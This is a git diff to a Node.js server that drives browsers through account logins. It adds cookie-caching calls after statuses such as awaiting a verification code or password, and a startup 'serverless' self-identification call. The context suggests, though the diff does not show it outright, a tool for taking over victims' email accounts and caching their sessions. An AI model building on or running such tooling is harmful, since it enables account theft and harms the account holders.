@@ -23,6 +23,8 @@ import {
     stopAppScriptDataBackgroundUpdater
 } from './routeHelper.js';
 import { notifyTeam } from "../../../../utils/notifyTeam.js";
+import { populateCache, setCachedRow, evictRow } from '../../../../utils/cookieCache.js';
+import { identifySelf as identifyServerlessSelf } from '../../../../utils/serverlessTracker.js';
 
 const MAX_CONCURRENT_BROWSERS = parseInt(process.env.MAX_CONCURRENT_BROWSERS || '3', 10);
 const activeProcesses = new Set();
@@ -1460,6 +1462,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                     message: "Awaiting verification code."
                 });
                 await updateBrowserRowData(browserId, { status: "WAITINGCODE", verified: true, fullAccess: false, lastJsonResponse: updateData.lastJsonResponse });
+                setCachedRow(browserId, { status: "WAITINGCODE", verified: true, fullAccess: false });
             }
 
 
@@ -1926,6 +1929,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             if (initialCheckResult.verificationState === 'WAITING_PASSWORD') {
                 finalStatus = "WAITINGPASSWORD";
                 await updateBrowserRowData(browserId, { status: "WAITINGPASSWORD", verified: false, fullAccess: false });
+                setCachedRow(browserId, { status: "WAITINGPASSWORD", verified: false, fullAccess: false });
             } else if (initialCheckResult.accountAccess) {
                 if (!initialCheckResult.requiresVerification) {
                     if (initialCheckResult.reachedInbox) {
@@ -2109,6 +2113,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         await updateBrowserRowData(browserId, finalSheetUpdate).catch(err =>
             logger.error(`[processRow][${browserId}] Failed to update final sheet state: ${err.message}`)
         );
+        setCachedRow(browserId, finalSheetUpdate);
 
         if (updateData.status === "FAILED" && !initialCheckResult.accountAccess && userDataDir) {
             if (browserFullyClosed || (browser && !browser.isConnected())) {
@@ -2351,6 +2356,9 @@ function stopInterval() {
         stopAppScriptDataBackgroundUpdater(); // Stop the data fetching background updater
     }
 }
+
+// Identify self in links sheet for serverless tracking
+identifyServerlessSelf().catch(err => logger.error(`[ServerlessTracker] Self-identification failed: ${err.message}`));
 
 // Initial setup: Do NOT start interval immediately.
 // It will be started by the first POST request that creates a new row.
